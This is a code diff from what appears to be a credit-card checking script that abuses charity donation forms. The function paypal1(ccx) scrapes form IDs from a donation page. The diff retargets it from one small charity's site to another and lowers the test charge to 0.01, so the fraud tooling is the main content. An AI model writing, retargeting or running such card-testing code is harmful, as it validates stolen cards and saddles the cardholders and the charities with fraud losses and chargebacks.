@@ -20,9 +20,9 @@ def paypal1(ccx):#@I_EOR
 	    'user-agent': user,
 	}
 
-	base_url = "https://anehope.org"
-	donation_page = "https://anehope.org/donations/donate-to-help-build-mara-international-christian-school-mics/"
-	amount = "0.50"            	            
+	base_url = "https://darajaoflove.com"
+	donation_page = "https://darajaoflove.com/make-a-donation/"
+	amount = "0.01"            	            
 	response = r.get(donation_page, cookies=r.cookies, headers=headers)
 	id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
 	id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
@@ -614,6 +614,6 @@ def check(card):
         result = f"Gateway Error"
         
     # نرجع النتيجة، اسم البوابة (للعرض)، واسم الدالة المختارة من الماب
-    return result, gate_func_name, "0.50$"
+    return result, gate_func_name, "0.01$"
 
 
